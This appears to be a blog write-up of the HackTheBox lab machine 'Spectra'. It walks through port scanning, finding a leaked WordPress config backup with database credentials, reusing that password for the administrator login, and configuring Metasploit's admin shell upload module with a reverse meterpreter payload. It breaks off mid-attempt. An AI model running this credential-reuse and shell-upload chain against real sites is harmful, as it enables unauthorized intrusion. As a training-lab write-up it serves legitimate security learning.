+++
title = "HackTheBox Write-up&mdash;Spectra"
+++

This machine has IP 10.10.10.229.

Let's enumerate the open ports:
```bash
Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-12 17:30 NZST
Nmap scan report for spectra (10.10.10.229)
Host is up (0.25s latency).
Not shown: 997 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.1 (protocol 2.0)
| ssh-hostkey:
|_  4096 52:47:de:5c:37:4f:29:0e:8e:1d:88:6e:f9:23:4d:5a (RSA)
80/tcp   open  http    nginx 1.17.4
|_http-server-header: nginx/1.17.4
|_http-title: Site doesn't have a title (text/html).
3306/tcp open  mysql   MySQL (unauthorized)
|_ssl-cert: ERROR: Script execution failed (use -d to debug)
|_ssl-date: ERROR: Script execution failed (use -d to debug)
|_sslv2: ERROR: Script execution failed (use -d to debug)
|_tls-alpn: ERROR: Script execution failed (use -d to debug)
|_tls-nextprotoneg: ERROR: Script execution failed (use -d to debug)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 62.37 seconds
```

I go to the HTTP port on my browser and get:
```
Issue Tracking
Until IT set up the Jira we can configure and use this for issue tracking.
Software Issue Tracker
Test
```

The `Software Issue Tracker` and `Test` are both hyperlinks.

Clicking on `Software Issue Tracker takes us to `http://spectra.htb/main/index.php`.  This site seems to be hosted on WordPress.  `Test` takes us to `http://spectra.htb/testing/index.php`, but when clicking on this we get `Error establishing a database connection`.  Running `ffuf` on this `/testing` subdomain we find some interesting files:
```
wp-admin                [Status: 301, Size: 169, Words: 5, Lines: 8]
wp-content              [Status: 301, Size: 169, Words: 5, Lines: 8]
wp-includes             [Status: 301, Size: 169, Words: 5, Lines: 8]
```

We can also go directly to the `/testing` subdomain and see a bunch of files available to us (as well as the aforementioned sub-subdomains).  It looks like most of these are unavailable to us, but some of them are not, such as the `wp-config.php.save` file:
```bash
$ curl --silent http://spectra.htb/testing/wp-config.php.save | grep -i 'user' | grep -v '^\/\*'
define( 'DB_USER', 'devtest' );
 * You can change these at any point in time to invalidate all existing cookies. This will force all users to have to log in again.

$ curl --silent http://spectra.htb/testing/wp-config.php.save | grep -i 'pass' | grep -v '^\/\*'
define( 'DB_PASSWORD', 'devteam01' );
```

So we may have a password and username to use...  We explore the `/main` domain, and find `http://spectra.htb/main/wp-login.php`.  I try the password and username here, but it doesn't work, unfortunately.  However, I recall that the first `Hello World` post on `/main` is written by user `administrator`, so I try that with the password we found, and this works!  Now we are taken to `http://spectra.htb/main/wp-admin/`.  I go to the `All Users` link at `/users.php` and we see this one user (`administrator`), whose email is `devteam@megabank.local`.

I go to `msfconsole` and search `wp admin` (because I have access to wordpress as an admin):
```
msf6 > search wp admin

Matching Modules
================

   #   Name                                                      Disclosure Date  Rank       Check  Description
   -   ----                                                      ---------------  ----       -----  -----------
.........
   10  exploit/unix/webapp/wp_admin_shell_upload                 2015-02-21       excellent  Yes    WordPress Admin Shell Upload
.........

Interact with a module by name or index. For example info 23, use 23 or use exploit/unix/webapp/wp_wysija_newsletters_upload

msf6 > use exploit/unix/webapp/wp_admin_shell_upload
[*] No payload configured, defaulting to php/meterpreter/reverse_tcp
msf6 exploit(unix/webapp/wp_admin_shell_upload) > show options

Module options (exploit/unix/webapp/wp_admin_shell_upload):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   PASSWORD                    yes       The WordPress password to authenticate with
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT      80               yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /                yes       The base path to the wordpress application
   USERNAME                    yes       The WordPress username to authenticate with
   VHOST                       no        HTTP server virtual host


Payload options (php/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   WordPress


msf6 exploit(unix/webapp/wp_admin_shell_upload) > set PASSWORD 'devteam01'
PASSWORD => devteam01
msf6 exploit(unix/webapp/wp_admin_shell_upload) > set USERNAME 'administrator'
USERNAME => administrator
msf6 exploit(unix/webapp/wp_admin_shell_upload) > set RHOSTS '10.10.10.229'
RHOSTS => 10.10.10.229
msf6 exploit(unix/webapp/wp_admin_shell_upload) > set LHOST '10.10.14.239'
LHOST => 10.10.14.239
msf6 exploit(unix/webapp/wp_admin_shell_upload) > set VHOST 'spectra.htb'
VHOST => spectra.htb
msf6 exploit(unix/webapp/wp_admin_shell_upload) > set TARGETURI '/main'
TARGETURI => /main
msf6 exploit(unix/webapp/wp_admin_shell_upload) > set target 0
target => 0
```

This kept failing.  I mean, the exploit kept working, but no reverse shell from it.  However, after much Googling, I found that I needed to manually configure the payload, because it wasn't enough.

set PAYLOAD osx/x64/meterpreter_reverse_tcp
set PAYLOAD osx/x86/isight/bind_tcp
